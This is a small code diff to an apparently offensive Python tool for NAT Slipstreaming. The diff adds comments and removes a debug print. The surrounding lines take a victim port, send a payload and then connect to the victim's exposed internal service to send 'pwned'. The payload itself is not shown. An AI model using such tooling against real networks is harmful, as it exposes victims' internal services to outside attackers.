@@ -33,6 +33,7 @@ def port(num):
 	raise ArgumentTypeError('Value {} invalid port. Must be integer within [1, 65535]')
 
 
+# CLI argument parsing
 def get_args():
 	parser = ArgumentParser(description='NAT Slipstreaming via Python')
 	parser.add_argument('pwn_port', help='Port on the victim to connect to', type=port, default=3306)
@@ -104,9 +105,10 @@ def main(args):
 		print('-' * len(header))
 
 		con.send(BODY.encode("ascii"))
+
+		# Connect to pwnd service
 		con_ip, con_port = search(contact_pattern, contact).group().split(':')
 		s2 = socket(AF_INET, SOCK_STREAM)
-		print(con_ip, con_port)
 		s2.connect((con_ip, int(con_port)))
 		s2.send(b'pwned\n')
 		s2.close()
